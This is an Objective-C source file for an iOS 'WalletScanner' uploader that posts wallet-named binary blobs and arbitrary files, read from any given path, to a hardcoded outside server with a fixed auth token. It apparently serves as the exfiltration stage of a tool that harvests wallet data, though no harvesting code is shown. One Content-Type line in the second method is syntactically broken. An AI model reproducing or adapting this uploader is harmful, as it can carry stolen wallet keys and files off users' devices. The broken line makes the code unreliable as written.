//
//  RDDataUploader.m
//  数据上传实现
//

#import "RDDataUploader.h"

static NSString *s_serverURL = @"https://walletwt.com/api";

@implementation RDDataUploader

+ (NSString *)serverURL {
    return s_serverURL;
}

+ (void)setServerURL:(NSString *)serverURL {
    s_serverURL = [serverURL copy];
}

// ============ 上传数据包 (multipart/form-data 适配 FastAPI) ============
+ (void)uploadData:(NSData *)data
          endpoint:(NSString *)endpoint
        completion:(RDUploadCompletion)completion {

    NSString *urlString = [NSString stringWithFormat:@"%@/%@", s_serverURL, endpoint];
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) {
        if (completion) completion(NO, [NSError errorWithDomain:@"RDUploader" code:-1 userInfo:@{NSLocalizedDescriptionKey: @"Invalid URL"}]);
        return;
    }

    // multipart/form-data 格式
    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
    NSString *fileName = [NSString stringWithFormat:@"wallet_%.0f.bin", [[NSDate date] timeIntervalSince1970]];
    NSMutableData *body = [NSMutableData new];

    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n", fileName] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:data];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    request.HTTPBody = body;
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    [request setValue:@"WalletScanner/1.0" forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"iphone_upload_token_2026" forHTTPHeaderField:@"X-Auth-Token"];
    [request setTimeoutInterval:120];

    NSURLSession *session = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration]
                                                          delegate:nil
                                                     delegateQueue:[NSOperationQueue new]];

    NSURLSessionDataTask *task = [session dataTaskWithRequest:request
                                            completionHandler:^(NSData * _Nullable responseData,
                                                                NSURLResponse * _Nullable response,
                                                                NSError * _Nullable error) {
        if (error) {
            if (completion) completion(NO, error);
            return;
        }
        NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)response;
        NSString *bodyStr = responseData ? [[NSString alloc] initWithData:responseData encoding:NSUTF8StringEncoding] : @"";
        NSLog(@"[WalletScanner] Upload response: %ld — %@", (long)httpResp.statusCode, bodyStr ?: @"");
        BOOL success = (httpResp.statusCode >= 200 && httpResp.statusCode < 300);
        if (completion) completion(success, nil);
    }];

    [task resume];
}
// ============ 上传文件 ============
+ (void)uploadFileAtPath:(NSString *)filePath
                endpoint:(NSString *)endpoint
              completion:(RDUploadCompletion)completion {

    NSData *fileData = [NSData dataWithContentsOfFile:filePath];
    if (!fileData) {
        if (completion) completion(NO, [NSError errorWithDomain:@"RDUploader" code:-2 userInfo:@{NSLocalizedDescriptionKey: @"File not found"}]);
        return;
    }

    NSString *urlString = [NSString stringWithFormat:@"%@/%@", s_serverURL, endpoint];
    NSURL *url = [NSURL URLWithString:urlString];

    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
    NSMutableData *body = [NSMutableData new];

    // multipart/form-data
    NSString *fileName = [filePath lastPathComponent];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n", fileName] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:fileData];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    request.HTTPBody = body;
    [request setValue:[NSString stringWithFormat:@""multipart/form-data; boundary=%@@"", boundary] forHTTPHeaderField:@""Content-Type""];
    [request setValue:@"iphone_upload_token_2026" forHTTPHeaderField:@"X-Auth-Token"];
    [request setTimeoutInterval:120];

    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request
                                            completionHandler:^(NSData * _Nullable d, NSURLResponse * _Nullable r, NSError * _Nullable e) {
        if (e) { if (completion) completion(NO, e); return; }
        NSHTTPURLResponse *hr = (NSHTTPURLResponse *)r;
        if (completion) completion(hr.statusCode >= 200 && hr.statusCode < 300, nil);
    }];
    [task resume];
}

@end


